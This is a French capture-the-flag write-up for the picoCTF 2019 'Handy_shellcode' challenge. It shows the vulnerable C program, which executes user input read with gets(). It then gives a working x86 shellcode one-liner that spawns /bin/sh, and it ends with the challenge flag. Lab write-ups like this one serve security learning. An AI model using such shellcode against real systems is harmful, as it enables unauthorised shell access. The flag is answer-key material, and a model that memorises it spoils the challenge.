# Binary_Exploitation_50_Handy_shellcode

------

### Titre : Handy_shellcode

### Points : 50

------

### Description 

Ce programme exécute n'importe quel shellcode que vous lui donnez. Pouvez-vous générer un shell et l'utiliser pour lire le fichier flag.txt ? (Merci à google translate :))

------

#### Hints

* vous pourrez peut-être trouver un bon shellcode en ligne. 

------

On se connecte vite en ssh sur le serveur shell  `nc xxx.xxxxxxxxxx.fr 50004`,...



### Résolution

---

Puis une fois on a les trois fichiers suivants : flag.txt, vuln.c vuln. Je commence d'abord par analyser le programme c :
```c
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter your shellcode:");
  vuln(buf);

  puts("Thanks! Executing now...");
  
  ((void (*)())buf)();


  puts("Finishing Executing Shellcode. Exiting now...");
  
  return 0;
}
...
```

Ce programme utilise un buffer pour lire l'input de l'utilisateur on peut donc s'en servir pour envoyé un shellcode (Il s’agit donc essentiellement d’un morceau de code compilé arbitraire qui peut être injecté dans un programme afin d’engendrer un shell dans le système d’exploitation exécuté par le programme) aprés quelques recherches concernant le shellcode j'ai trouvé ce payload :
```bash
$ (echo -en "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"; cat )  | ./vuln
...
```

![alt text](https://raw.githubusercontent.com/Amadimk/PICO2019-CTF/master/handy_shell.png?token=AGO2MU5FXFV3CUFTW6EKPDK5WNMVA)


`picoCTF{h4ndY_d4ndY_sh311c0d3_55c521fe}`
